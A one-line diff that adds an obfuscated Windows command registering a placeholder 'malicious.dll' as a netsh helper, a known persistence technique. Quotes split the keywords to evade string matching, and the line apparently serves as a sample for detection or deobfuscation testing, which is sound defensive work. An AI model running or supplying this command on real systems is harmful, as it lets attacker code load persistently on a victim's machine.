@@ -1,0 +1,1 @@
+netsh a"dd" "help"er C:\path\to\malicious.dll
